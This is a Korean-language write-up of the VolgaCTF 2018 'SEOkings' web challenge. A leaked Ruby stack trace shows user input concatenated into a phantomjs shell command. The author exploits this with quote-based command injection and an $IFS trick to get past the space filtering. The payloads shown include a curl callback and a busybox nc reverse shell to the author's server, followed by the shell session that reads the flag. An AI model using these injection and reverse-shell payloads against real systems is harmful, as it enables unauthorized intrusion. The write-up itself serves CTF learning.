# [Web] VolgaCTF - SEOkings

## Description

We are SEOkings and we so innovative

[http://seo-kings.quals.2018.volgactf.ru:8080](http://seo-kings.quals.2018.volgactf.ru:8080/)

##### Hints

1. You missed some parameters



## Analysis

페이지에 접속하면 단 하나의 파라미터 밖에 존재하지 않는다.

내 서버를 입력하고 Try 해보았으나 아무 반응이 없었다.

site의 값을 Arrat로 넣어주면 에러가 발생한다.

```ruby
# /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb in escape 
    # replacing them with codes.
    #
    def escape(str, unsafe = @regexp[:UNSAFE])
      unless unsafe.kind_of?(Regexp)
        # perhaps unsafe is String object
        unsafe = Regexp.new("[#{Regexp.quote(unsafe)}]", false)
      end
      str.gsub(unsafe) do
        us = $&
        tmp = ''
        us.each_byte do |uc|
          tmp << sprintf('%%%02X', uc)
        end
        tmp
      end.force_encoding(Encoding::US_ASCII)

# /usr/lib/ruby/2.3.0/uri/common.rb in escape 
    #   # => "http://example.com/?a=\t\r"
    #
    #   p URI.escape("@?@!", "!?")
    #   # => "@%3F@%21"
    #
    def escape(*arg)
      warn "#{caller(1)[0]}: warning: URI.escape is obsolete" if $VERBOSE
      DEFAULT_PARSER.escape(*arg)
    end
    alias encode escape
    #
    # == Synopsis
    #
    #   URI.unescape(str)
    #

# /opt/seo-kings/app/controllers/main_controller.rb in runAdmin 
   get '/*' do
    erb :page_error
  end
  
  def runAdmin(site)
  pid = Process.spawn("phantomjs --web-security=no bot.js '" +  URI.escape(site)  + "'")
  begin
      Timeout.timeout(1) do
      Process.wait(pid)
    end
  rescue Timeout::Error
      Process.kill('TERM', pid)
  end

# /opt/seo-kings/app/controllers/main_controller.rb in block in <class:MainController>
    erb :main
  end

   post '/' do
    site = params[:site]
    unless site.nil?
      runAdmin(site)
    end
    erb :main
  end

  get '/validator' do
    unless local?
```

여기서 알 수 있는 것은 runAdmin함수에서 Process를 실행시킨다는 것이다.

>  pid = Process.spawn("phantomjs --web-security=no bot.js '" +  URI.escape(site)  + "'")

다행히도 URI.escape 함수는 Quote(')를 필터링 하지 않는다.

이를 이용해 Command Injection을 하였다.

## Exploit

Command Injection을 해야하지만 URI.escape에 의해 공백을 사용할 수가 없다.

이는 \$IFS와 \$()를 통해 우회하자.

> \$ echo\$IFS1
>
> \$ echo\$IFS\$()1
> 1

**Query :** ';curl\$IFS\$()[MY SERVER];'

```
$ python -m SimpleHTTPServer 10101
Serving HTTP on 0.0.0.0 port 10101 ...
188.246.233.46 - - [26/Mar/2018 11:50:17] "GET / HTTP/1.1" 200 -
```

이제 nc를 통해 Shell을 얻고 flag를 찾아보자.

**Query :** ';busybox\$IFS\$()nc\$IFS\$()[MY SERVER]\$IFS\$()10101\$IFS\$()-esh;'

```
ls -al
total 24
drwxr-xr-x    6 root     root          4096 Mar 24 01:32 .
drwxr-xr-x    3 root     root          4096 Mar 24 20:09 ..
drwxr-xr-x    2 root     root          4096 Mar 25 05:45 constants
drwxr-xr-x    2 root     root          4096 Mar 24 01:32 controllers
drwxr-xr-x    3 root     root          4096 Mar 24 01:32 public
drwxr-xr-x    2 root     root          4096 Mar 24 01:32 views
cd constants
ls -al
total 12
drwxr-xr-x    2 root     root          4096 Mar 25 05:45 .
drwxr-xr-x    6 root     root          4096 Mar 24 01:32 ..
-rw-r--r--    1 root     root            65 Mar 24 01:32 file_wtih_flag.rb
cat *
class Flagclass
	FLAG = "VolgaCTF{hope_it_was_like_madness}"
end
```



**VolgaCTF{hope_it_was_like_madness}**